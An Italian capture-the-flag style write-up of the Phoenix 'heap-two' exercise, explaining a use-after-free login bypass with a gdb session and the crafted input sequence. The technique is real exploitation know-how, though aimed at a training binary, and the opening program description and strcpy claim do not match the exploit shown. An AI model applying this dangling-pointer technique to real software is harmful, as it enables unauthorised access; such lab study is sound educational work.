### Descrizione del Codice

Il programma `heap_two.c` esplora l'importanza di inizializzare esplicitamente la memoria allocata e cosa può accadere quando i valori dei puntatori diventano obsoleti.

### Funzionamento del Programma

1. Il programma alloca memoria per una struttura `auth` e una stringa `service`.
2. Copia gli argomenti della riga di comando nei blocchi di memoria allocati.
3. Libera i blocchi di memoria allocati.
4. Stampa un messaggio di errore.

### Problema di Sicurezza

Il problema di sicurezza risiede nell'uso della funzione `strcpy` senza controllare la dimensione, il che può causare un overflow del buffer. Questo può essere sfruttato per manipolare la gestione della memoria heap.

### Exploit

L'exploit sfrutta una vulnerabilità di tipo use-after-free (UAF). Se inseriamo "auth AAAA", il codice alloca memoria e la memorizza in `auth`, quindi copia il nome `AAAA` in `auth->name`. Per effettuare il login, `auth` deve puntare a un indirizzo di memoria e `auth->auth` non deve essere zero. Non possiamo sovrascrivere `name` poiché c'è un controllo sulla lunghezza con `strlen`.

Il bug qui è che `reset` libera la memoria allocata per `auth`, ma `auth` continua a puntare a quella posizione di memoria, che potrebbe contenere qualsiasi cosa. In questo caso, `auth` è chiamato un puntatore pendente.

La funzione `strdup` utilizza `malloc` per allocare memoria per una nuova stringa. Se c'è un blocco di memoria precedentemente liberato e abbastanza grande per soddisfare la richiesta, `malloc` utilizzerà quel blocco di memoria liberato per la nuova allocazione.

Quindi, se allochiamo memoria per `auth`, liberiamo quella memoria e poi inseriamo `service`, la funzione `strdup` utilizzerà l'indirizzo di memoria precedentemente liberato di `auth`, e ora possiamo scrivere qualsiasi cosa in `auth->auth` (stiamo scrivendo in `service`, ma `auth` punta già a quell'indirizzo).

L'obiettivo qui è solo cambiare `auth->auth` a qualsiasi valore, quindi useremo solo alcuni dati casuali.

### Esempio di Exploit

Il seguente esempio mostra come sfruttare la vulnerabilità:

```sh
$ gdb -q /opt/phoenix/i486/heap-two
Reading symbols from /opt/phoenix/i486/heap-two...(no debugging symbols found)...done.

gef➤  disassemble main
Dump of assembler code for function main:
.....
   0x080487e4 <+367>:	mov    eax,ds:0x8049adc
   0x080487e9 <+372>:	mov    eax,DWORD PTR [eax+0x20]
   0x080487ec <+375>:	test   eax,eax
.....

gef➤  b *0x080487e9
Breakpoint 1 at 0x80487e9

gef➤  r
Starting program: /opt/phoenix/i486/heap-two 

Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth AAAA
[ auth = 0x8049af0, service = 0 ]
reset 
[ auth = 0x8049af0, service = 0 ]
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
[ auth = 0x8049af0, service = 0x8049af0 ]
login 

Breakpoint 1, 0x080487e9 in main ()

gef➤  x/xw $eax+0x20
0x8049b10:	0x42424242		# valore di auth->auth

gef➤  c
Continuing.
you have logged in already!
[ auth = 0x8049af0, service = 0x8049af0 ]

### Soluzione

$ /opt/phoenix/i486/heap-two 
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth AAAA
[ auth = 0x8049af0, service = 0 ]
reset 
[ auth = 0x8049af0, service = 0 ]
serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
[ auth = 0x8049af0, service = 0x8049af0 ]
login 
you have logged in already!